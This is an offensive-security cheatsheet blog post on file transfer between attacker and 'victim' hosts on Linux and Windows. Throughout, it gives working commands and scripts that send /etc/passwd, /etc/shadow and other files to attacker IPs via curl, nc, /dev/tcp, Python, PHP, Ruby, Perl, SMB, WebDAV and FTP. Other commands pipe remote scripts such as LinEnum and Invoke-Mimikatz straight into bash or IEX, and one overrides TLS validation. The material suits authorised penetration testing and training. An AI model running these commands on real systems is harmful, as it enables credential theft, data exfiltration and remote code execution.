---
title: "File Transfer"
date: 2026-03-22
layout: post
permalink: /posts/file-transfer/
excerpt: "A cheatsheet for moving files to and from target systems during an engagement. It covers a broad range of transfer methods across Linux and Windows."
categories:
  - Cheatsheets
---


## PROTOCOL REFERENCE

|Protocol|Best For|Stealth|Notes|
|---|---|---|---|
|HTTP (Python)|Quick download|Low|Easiest|
|FTP|Simple upload/download|Medium|Often allowed|
|SMB|Windows environments|Medium|Very common|
|SCP|Secure transfer|High|Requires SSH|
|Netcat|Raw transfer|Medium|Works when others blocked|
|Evil-WinRM|Windows shells|High|Built-in upload/download|


## DECISION FLOW 

If Linux victim:

1. Try `wget`
2. Try `curl`
3. Try FTP
4. Try SCP
5. Try SMB
6. Fall back to nc
    

If Windows victim:

1. Try `iwr`
2. Try `certutil`
3. Try SMB
4. Try FTP
5. Use Evil-WinRM if available
    

---


## Linux

### Download Operations

#### Base64 Encoding / Decoding

**Attacker**

```bash
cat file.txt | base64 -w0; echo
```

**Victim**

```bash
echo -n '<BASE64_CODE>' | base64 -d > file.txt
```

---

#### `nc` and `/dev/tcp`

**Victim**

```bash
nc -nlvp 443 > file.txt
```

**Attacker**

```bash
# If bash is available
cat file.txt > /dev/tcp/10.10.x.x/443

# If using zsh or another shell
bash -c 'cat file.txt > /dev/tcp/10.10.x.x/443'
```

---

#### Netcat / `nc`

**Victim**

```bash
nc -nlvp 443 > file.txt
```

**Attacker**

```bash
nc -w 3 10.10.x.x 443 < file.txt
```

---

#### `wget`

**Attacker**

```bash
python3 -m http.server 80
```

**Victim**

```bash
# Download a file by specifying HTTP.
# Use -O to specify the output path.
# If omitted, the file is saved in the current directory.
wget http://10.10.x.x/file.txt
wget http://10.10.x.x/file.txt -O /tmp/file.txt

# Download a file directly from the IP.
wget 10.10.x.x/file.txt
wget 10.10.x.x/file.txt -O /tmp/file.txt
```

---

#### `curl`

**Attacker**

```bash
python3 -m http.server 80
```

**Victim**

```bash
# Download a file by specifying HTTP.
# Use -o to specify the output path.
# If omitted, the file is saved in the current directory.
curl http://10.10.x.x/file.txt
curl http://10.10.x.x/file.txt -o /tmp/file.txt

# Download a file directly from the IP.
curl 10.10.x.x/file.txt
curl 10.10.x.x/file.txt -o /tmp/file.txt
```

---
#### Fileless Download with `curl`

**Victim**

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

---

#### Fileless Download with `wget`

**Victim**

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
# Hello World!
```

---

#### Download with Bash (`/dev/tcp`)

There may be situations where none of the common file transfer tools are available. If Bash 2.04 or later is installed and compiled with `--enable-net-redirections`, you can use the built-in `/dev/tcp` feature to perform simple file downloads.

##### Connect to the target web server

**Attacker**

```bash
python3 -m http.server 80
```

**Victim**

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

##### Send an HTTP GET request

**Victim**

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\r\nHost: 10.10.10.32\r\nConnection: close\r\n\r\n" >&3
```

##### Print the response

**Victim**

```bash
cat <&3
```

---

#### SSH Downloads

`SSH` (Secure Shell) is a protocol that allows secure access to remote systems. The SSH suite includes `scp`, which uses SSH for secure file transfers.

`scp` (secure copy) is a command-line utility that lets you securely copy files and directories between two hosts. You can copy files from your local machine to a remote host, or from a remote host to your local machine.

`scp` is similar to `cp`, but instead of a local path, you specify a username, remote IP address or hostname, and authentication method.

##### Enable and start the SSH server

**Attacker**

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

##### Check whether SSH is listening

**Attacker**

```bash
netstat -lnpt
```

Example output:

```text
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Now files can be transferred.

##### Linux - Download files using `scp`

**Victim**

```bash
# Copy /etc/passwd from the attacker machine to the current directory on the victim
scp user@10.10.x.x:/etc/passwd .

# Copy /etc/passwd from the attacker machine to /tmp on the victim as "passwd"
scp user@10.10.x.x:/etc/passwd /tmp/passwd
```

**Note**

```text
You can create a temporary user account for file transfers to avoid using your primary credentials or SSH keys on a remote system.
```

---

#### Download Operations Using Python

Python is a common scripting language. Python 3 is the current standard, but some systems may still have Python 2.7 installed. Python can execute one-liners from the command line using the `-c` option.

##### Python 2

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

##### Python 3

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

#### Download Operations Using PHP

In the following example, `file_get_contents()` is used to download content from a URL, and `file_put_contents()` is used to save it locally. PHP can execute one-liners from the command line using the `-r` option.

##### PHP download with `file_get_contents()`

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is `fopen()`, which can be used to open a URL, read its contents, and write them to a local file.

##### PHP download with `fopen()`

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

You can also pipe downloaded content directly into another command, similar to the fileless `curl` and `wget` examples.

##### PHP download and pipe to Bash

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line) { echo $line; }' | bash
```

**Note**

```text
The URL can be used as a filename with the @file() function if URL-aware fopen wrappers are enabled.
```

---

#### Download Operations Using Ruby

##### Ruby - Download a file

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

#### Download Operations Using Perl

##### Perl - Download a file

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

### Upload Operations

#### `nc` and `/dev/tcp`

**Attacker**

```bash
nc -nlvp 443 > file.txt
```

**Victim**

```bash
# If bash is available
cat file.txt > /dev/tcp/10.10.x.x/443

# If using zsh or another shell
bash -c 'cat file.txt > /dev/tcp/10.10.x.x/443'
```

---

#### Base64 Encoding / Decoding

**Victim**

```bash
cat file.txt | base64 -w0; echo
```

**Attacker**

```bash
echo -n '<BASE64_CODE>' | base64 -d > file.txt
```

---

#### Web Upload

As mentioned in the file transfer section for Windows, `uploadserver` can be used as an extended Python HTTP server module that includes a file upload page. In this Linux example, it is configured to use HTTPS so the upload is protected in transit.

The first step is to install the `uploadserver` module.

##### Install and start the web upload server

**Attacker**

```bash
sudo python3 -m pip install --user uploadserver
```

Next, create a certificate. In this example, a self-signed certificate is used.

##### Create a self-signed certificate

**Attacker**

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

##### Start the HTTPS upload server

**Attacker**

```bash
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate ../server.pem
```

##### Linux - Upload multiple files

**Victim**

```bash
curl -X POST https://10.10.x.x/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

**Note**

```text
The --insecure option is used because the server is using a self-signed certificate that is trusted manually.
```

---

#### Web Upload Without a Certificate

**Attacker**

```bash
python3 -m uploadserver
```

Example output:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Victim**

```bash
curl -X POST http://10.10.16.11:8000/upload -F 'files=@/etc/passwd'

curl -X POST http://10.10.16.11:8000/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow'
```

---

#### Alternative Web File Transfer Method

Because Linux systems commonly have Python or PHP installed, it is often easy to start a lightweight web server for file transfers. If the compromised host is already running a web server, files can also be placed in the web root and retrieved through the site.

A Linux host may not always have a full web server installed. In those cases, a minimal built-in web server can be used instead. These are not designed for hardened production use, but they are flexible and quick to set up, and the web root and listening port can usually be changed easily.

---

##### Linux - Create a Web Server with Python 3

**Victim**

```bash
python3 -m http.server
```

---

##### Linux - Create a Web Server with Python 2.7

**Victim**

```bash
python2.7 -m SimpleHTTPServer
```

---

##### Linux - Create a Web Server with PHP

**Victim**

```bash
php -S 0.0.0.0:8000
```

---

##### Linux - Create a Web Server with Ruby

**Victim**

```bash
ruby -run -e httpd . -p 8000
```

---

##### Download the File from the Target Machine

**Attacker**

```bash
wget 10.10.x.x:8000/filetotransfer.txt

curl 10.10.x.x:8000/filetotransfer.txt -o filetotransfer.txt
```

**Note**

```text
When starting a temporary web server with Python, PHP, or Ruby, keep in mind that inbound traffic to the target may be blocked by host-based or network firewalls. In this case, the file is being served from the target and downloaded by the attacker.
```

---

#### SCP Upload

Some environments allow outbound SSH connections over TCP/22. If so, an SSH server and `scp` can be used to upload files to the target system.

##### Upload a file using `scp`

```bash
scp /etc/passwd user@10.10.x.x:/home/gnar/
```

**Note**

```text
The syntax for scp is similar to cp, except that the destination or source can include a remote username and host.
```

---

#### Upload Operations Using Python 3

If you want to upload a file with Python 3, you can use the `requests` module to send HTTP requests such as `GET`, `POST`, and `PUT`. The examples below use a Python upload server started with `uploadserver`.

##### Start the Python upload server

**Attacker**

```bash
python3 -m uploadserver
```

Example output:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

##### Upload a file using a Python one-liner

**Victim**

```bash
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd", "rb")})'
```

##### Upload a file using a Python script

**Victim — `upload.py`**

```python
import requests

# Define the target URL where the file will be uploaded.
URL = "http://192.168.187.128:8000/upload"

# Open the file to upload in binary mode.
file = open("/etc/passwd", "rb")

# Send the file using an HTTP POST request.
response = requests.post(URL, files={"files": file})

print(response.text)
```

**Run**

```bash
python3 upload.py
```

---

#### Upload Operations Using PHP

##### Start the Python upload server

**Attacker**

```bash
python3 -m uploadserver
```

Example output:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

##### Upload a file using a PHP one-liner

**Victim**

```bash
php -r '$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http://192.168.187.128:8000/upload"); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, ["files" => new CURLFile("/etc/passwd")]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($ch); curl_close($ch); echo $response;'
```

##### Upload a file using a PHP script

**Victim — `upload.php`**

```php
<?php
$target_url = "http://192.168.187.128:8000/upload";
$file_path = "/etc/passwd";

// Initialize cURL
$ch = curl_init();

// Configure the POST request with the file
$cfile = new CURLFile($file_path);
$post_data = ["files" => $cfile];

curl_setopt($ch, CURLOPT_URL, $target_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the request
$response = curl_exec($ch);

// Close cURL
curl_close($ch);

// Print the server response
echo $response;
?>
```

**Run**

```bash
php upload.php
```

---

#### Upload Operations Using Ruby

##### Start the Python upload server

**Attacker**

```bash
python3 -m uploadserver
```

Example output:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

##### Upload a file using a Ruby one-liner

**Victim**

```bash
# You may need to install this gem on the victim first, as it is not always installed by default.
gem install multipart-post

ruby -e "require 'net/http'; require 'uri'; require 'multipart/post'; url = URI.parse('http://192.168.187.128:8000/upload'); file = File.open('/etc/passwd', 'rb'); request = Net::HTTP::Post.new(url.path); request.set_form([['files', file]], 'multipart/form-data'); response = Net::HTTP.start(url.host, url.port) { |http| http.request(request) }; puts response.body"
```

##### Upload a file using a Ruby script

**Victim — `upload.rb`**

```ruby
require 'net/http'
require 'uri'
require 'multipart/post'

url = URI.parse("http://192.168.187.128:8000/upload")
file = File.open("/etc/passwd", "rb")

request = Net::HTTP::Post.new(url.path)
request.set_form([['files', file]], 'multipart/form-data')

response = Net::HTTP.start(url.host, url.port) { |http| http.request(request) }

puts response.body
```

**Run**

```bash
ruby upload.rb
```

---

#### Upload Operations Using Perl

##### Start the Python upload server

**Attacker**

```bash
python3 -m uploadserver
```

Example output:

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

##### Upload a file using a Perl one-liner

**Victim**

```bash
perl -e 'use LWP::UserAgent; use HTTP::Request::Common qw(POST); use HTTP::Request; my $url = "http://192.168.187.128:8000/upload"; my $file_path = "/etc/passwd"; my $ua = LWP::UserAgent->new; my $response = $ua->request(POST $url, Content_Type => "multipart/form-data", Content => [ "files" => [ $file_path ] ]); print $response->decoded_content;'
```

##### Upload a file using a Perl script

**Victim — `upload.pl`**

```perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use HTTP::Request;
use File::Basename;

my $url = 'http://192.168.187.128:8000/upload';
my $file_path = '/etc/passwd';

# Create an LWP::UserAgent object
my $ua = LWP::UserAgent->new;

# Create a POST request with the file
my $response = $ua->request(
    POST $url,
    Content_Type => 'multipart/form-data',
    Content      => [
        'files' => [ $file_path ]
    ]
);

# Print the server response
print $response->decoded_content;
```

**Run**

```bash
perl upload.pl
```


---

### GTFOBins

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

To search for the download and upload function in [GTFOBins](https://gtfobins.org/#+file%20download) for Linux binaries, we can use `+file download` or `+file upload.`

---

## Windows

### Download Operations

#### SMB Server

>One practical note: for uploads, the shared directory on the attacker side needs to be writable by the process running `smbserver.py`.

**Easy ways to address it**:  Use a writable temp directory

```
mkdir -p /tmp/share  
ls -ld /tmp/share  
smbserver.py share /tmp/share
```


**ATTACKER**

```bash
# From Kali Linux, start an SMB server and share files between machines
impacket-smbserver smbFolder $(pwd) -smb2support
```

**VICTIM**

```cmd
REM From Windows, download files from Kali Linux to the Windows host
copy \\<ATTACKER_IP>\smbFolder\file.txt C:\path\destination\file.txt
```

Newer versions of Windows may block unauthenticated guest access, for example:

```text
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

In that case, configure a username and password on the Impacket SMB server and map the share on Windows before copying the file.

**ATTACKER**

```bash
# Start an SMB server with authentication
impacket-smbserver smbFolder $(pwd) -username gnar -password gnar123 -smb2support
```

**VICTIM**

```cmd
REM Map the SMB share and transfer the file to Windows
net use x: \\<ATTACKER_IP>\smbFolder /user:gnar gnar123
copy x:\file.txt C:\path\destination\file.txt
```

---

#### `certutil.exe`

**ATTACKER**

```bash
python3 -m http.server 80
```

**VICTIM**

```cmd
certutil.exe -f -urlcache -split http://<ATTACKER_IP>/file.txt C:\path\destination\file.txt
```

---

#### PowerShell Download Operations

There are several ways to transfer a file to a Windows target through PowerShell.

##### PowerShell File Download

`DownloadFile` downloads data from a resource to a local file.

`DownloadFileAsync` downloads data from a resource to a local file without blocking the calling thread.

**DownloadFile**

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>', '<Output File Name>')
```

Example:

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

**DownloadFileAsync**

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>', '<Output File Name>')
```

Example:

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

---

##### PowerShell `Invoke-WebRequest`

**ATTACKER**

```bash
python3 -m http.server 80
```

**VICTIM**

```powershell
IWR -Uri http://<ATTACKER_IP>/file.txt -OutFile C:\path\destination\file.txt
```

```powershell
Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.txt -OutFile C:\path\destination\file.txt
```

---

##### PowerShell `DownloadString` - Fileless Method

Execute the script directly in memory with `IEX`.

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

---

##### PowerShell Base64 Transfer

**ATTACKER**

```bash
cat file.txt | base64 -w 0; echo
```

**VICTIM**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\file.txt", [Convert]::FromBase64String("<BASE64_CODE>"))
```

```powershell
powershell -c "[IO.File]::WriteAllBytes('C:\Users\Public\file.txt', [Convert]::FromBase64String('<BASE64_CODE>'))"
```

---

##### Common Errors with PowerShell

###### Internet Explorer 11 Initial Setup Not Completed

There may be cases where the initial Internet Explorer configuration has not been completed, which can prevent `Invoke-WebRequest` from working properly.

This can be avoided by using the `-UseBasicParsing` parameter.

```powershell
PS C:\htb> IWR -Uri http://<ATTACKER_IP>/PowerView.ps1 | IEX
```

Error:

```text
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

Use:

```powershell
PS C:\htb> IWR -Uri http://<ATTACKER_IP>/PowerView.ps1 -UseBasicParsing | IEX
```

---

###### Secure Channel SSL/TLS Is Not Trusted

Another common PowerShell download error is related to SSL/TLS when the certificate is not trusted.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Error:

```text
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
```

Bypass:

```powershell
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


##### Bitsadmin Download Function

The Background Intelligent Transfer Service (`BITS`) can download files from HTTP sites or SMB shares. It has the advantage of transferring files in a way that minimizes impact on network and system load.

**VICTIM**

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.x.x:8000/nc.exe C:\Users\gnar\Desktop\nc.exe
```

##### PowerShell + BITS

**VICTIM**

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.x.x:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

#### `curl`

**ATTACKER**

```bash
python3 -m http.server 80
```

**VICTIM**

```cmd
curl http://<ATTACKER_IP>/file.txt -o C:\path\destination\file.txt
curl <ATTACKER_IP>/file.txt -o C:\path\destination\file.txt
```

---

#### `wget`

**ATTACKER**

```bash
python3 -m http.server 80
```

**VICTIM**

```cmd
wget http://<ATTACKER_IP>/file.txt
wget http://<ATTACKER_IP>/file.txt -O C:\path\destination\file.txt

wget <ATTACKER_IP>/file.txt
wget <ATTACKER_IP>/file.txt -O C:\path\destination\file.txt
```

Note:

```text
If you do not specify an output file, the file will be downloaded to the current directory.
```

---

#### FTP Downloads

Another way to transfer files is through FTP (File Transfer Protocol), which commonly uses TCP/21 and TCP/20. Files can be downloaded with the Windows FTP client or with PowerShell `Net.WebClient`.

You can configure an FTP server on the attacker host using the Python `pyftpdlib` module.

>by default, it serves the directory you launch it from.

**ATTACKER**

```bash
sudo pip3 install pyftpdlib --break-system-packages
sudo python3 -m pyftpdlib --port 21
```

Anonymous authentication is enabled by default if no username or password is configured.

Once the FTP server is running, files can be downloaded using PowerShell:

**VICTIM**

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Create an FTP command file and download the target file

**VICTIM**

```cmd
echo open 192.168.134.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt
```

Example output:

```text
ftp> open 192.168.134.128
Log in with USER and PASS first.
ftp> USER anonymous
ftp> GET file.txt
ftp> bye
```

Verify the downloaded file:

```powershell
Get-Content .\file.txt
```

---

#### JavaScript

JavaScript can also be used on Windows to download files. Create a file called `wget.js` with the following content:

**`wget.js`**

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run it from Command Prompt or PowerShell:

**VICTIM**

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

#### VBScript

VBScript can also be used to download files on Windows. Create a file called `wget.vbs` with the following content:

**`wget.vbs`**

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Run it from Command Prompt or PowerShell:

**VICTIM**

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

### Upload Operations

#### PowerShell Upload Operations

There are several ways to transfer a file from a Windows target to the attacker machine using PowerShell.
##### PowerShell Base64

**VICTIM**

```powershell
# Convert the binary file 'file.bin' to Base64
powershell -c "[Convert]::ToBase64String((Get-Content C:\Temp\file.bin -Encoding Byte))"
```

```powershell
[Convert]::ToBase64String((Get-Content C:\Temp\file.bin -Encoding Byte))
```

**ATTACKER**

```bash
# Decode the Base64 content to recover the original file
echo '<BASE64_CODE>' | base64 -d > file.bin
```

---

##### PowerShell Web Uploads

PowerShell does not include a built-in file upload feature, but `Invoke-WebRequest` or `Invoke-RestMethod` can be used to build one. You also need a web server that accepts file uploads, since this is not enabled by default on most common web servers.

For the web server, you can use `uploadserver`, an extended Python `http.server` module that includes a file upload page.

**ATTACKER**

```bash
sudo pipx install uploadserver
python3 -m uploadserver
```

Now you can use a PowerShell script such as `PSUpload.ps1`, which uses `Invoke-RestMethod` to perform file upload operations.

The script accepts two parameters:

- `-File` to specify the file path
- `-Uri` to specify the upload server URL

Example: upload the `hosts` file from a Windows system.

**VICTIM**

*Option 1*

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

What happens here:

- `DownloadString(...)` grabs the raw `.ps1` file as text
- `IEX` (`Invoke-Expression`) executes that text in your current session
- that execution **defines the function**
- then `Invoke-FileUpload` becomes callable

Without the first line, PowerShell has no idea what `Invoke-FileUpload` is.

Example output:

```text
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

*Option 2: Save the script locally, then load it

If you already have `PSUpload.ps1` on disk, you must **dot-source** it or run it in a way that loads the function into the current session:

```
. .\PSUpload.ps1
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

##### PowerShell Base64 Web Upload

Another option is to Base64-encode the file in PowerShell and send it in an HTTP POST request. A Netcat listener on the attacker machine can capture the request body, which can then be decoded back into the original file.

**VICTIM**

```powershell
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.134.128:8000/ -Method POST -Body $b64
```

**ATTACKER**

```bash
nc -nlvp 8000
```

Example captured request:

```text
listening on [any] 8000 ...
connect to [192.168.134.128] from (UNKNOWN) [192.168.134.1] 52051
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; es-ES) WindowsPowerShell/5.1.26100.2161
Content-Type: application/x-www-form-urlencoded
Host: 192.168.134.128:8000
Content-Length: 1100
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1N0cw==
```

Then decode the Base64 data:

**ATTACKER**

```bash
echo '<BASE64_CODE>' | base64 -d > hosts
```


---

#### SMB Uploads

##### SMB Server

>One practical note: for uploads, the shared directory on the attacker side needs to be writable by the process running `smbserver.py`.

**Easy ways to address it**:  Use a writable temp directory

```
mkdir -p /tmp/share  
ls -ld /tmp/share  
smbserver.py share /tmp/share
```


**ATTACKER**

```bash
# From Kali Linux, start an SMB server to share files between machines
impacket-smbserver smbFolder $(pwd) -smb2support
```

**VICTIM**

```cmd
REM From Windows, upload a file to the SMB share on Kali Linux
copy C:\path\file.txt \\<ATTACKER_IP>\smbFolder\file.txt
```

Newer versions of Windows may block unauthenticated guest access, for example:

```text
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

In that case, configure a username and password on the Impacket SMB server and map the share on Windows before copying the file.

**ATTACKER**

```bash
# Start an SMB server with authentication
impacket-smbserver smbFolder $(pwd) -username gnar -password gnar123 -smb2support
```

**VICTIM**

```cmd
REM Map the SMB share and upload the file directly to Kali Linux
net use x: \\<ATTACKER_IP>\smbFolder /user:gnar gnar123
copy C:\path\file.txt x:\file.txt
```

---

#### WebDAV

Many environments allow outbound HTTP (TCP/80) and HTTPS (TCP/443) traffic, but block outbound SMB (TCP/445). One alternative is to use WebDAV, which provides file sharing over HTTP or HTTPS.

WebDAV is an extension of HTTP that allows a web server to function as a file server.

When Windows tries to access a UNC path, it may first attempt SMB, and if no SMB share is available, it may then fall back to WebDAV over HTTP.

##### 1. Install the WebDAV Python modules

**ATTACKER**

```bash
sudo pip3 install wsgidav cheroot --break-system-packages
```

##### 2. Start the WebDAV server

**ATTACKER**

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

##### 3. Connect to the WebDAV share

**VICTIM — CMD**

```cmd
dir \\192.168.134.128\DavWWWRoot
```

Example output:

```text
 Volume in drive \\192.168.134.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.134.128\DavWWWRoot

06/03/2025  02:44    <DIR>          .
06/03/2025  02:44    <DIR>          ..
06/03/2025  02:18    <DIR>          tmp.h4ikej9g1U
```

Another method from PowerShell:

**VICTIM — PowerShell**

```powershell
net use * http://192.168.134.128/ /user:anonymous ""
```

Then verify the mapped drive:

```powershell
dir Z:
```

Example output:

```text
    Directory: Z:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        06/03/2025      2:18                tmp.h4ikej9g1U
d-----        06/03/2025      0:32                tmp.CfttO9JChM
```

##### 4. Upload files using WebDAV

**VICTIM — CMD**

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.134.129\DavWWWRoot\
```

**VICTIM — PowerShell**

```powershell
copy file.txt Z:\
```

---

#### FTP Uploads

Uploading files over FTP is similar to downloading files. You can use either PowerShell or the FTP client.

Before starting the FTP server with the Python `pyftpdlib` module, use the `--write` option to allow clients to upload files.

**ATTACKER**

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

##### PowerShell upload file

**VICTIM**

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.134.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

##### Create a command file for the FTP client to upload a file

**VICTIM**

```powershell
echo "open 192.168.134.128" > ftpcommand.txt
echo "USER anonymous" >> ftpcommand.txt
echo "binary" >> ftpcommand.txt
echo "PUT C:\Windows\System32\drivers\etc\hosts" >> ftpcommand.txt
echo "bye" >> ftpcommand.txt
```

Run it:

```cmd
ftp -v -n -s:ftpcommand.txt
```

Example output:

```text
ftp> open 192.168.134.128
Log in with USER and PASS first.
ftp> USER anonymous
ftp> PUT C:\Windows\System32\drivers\etc\hosts
ftp> bye
```

---

### LOLBAS

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

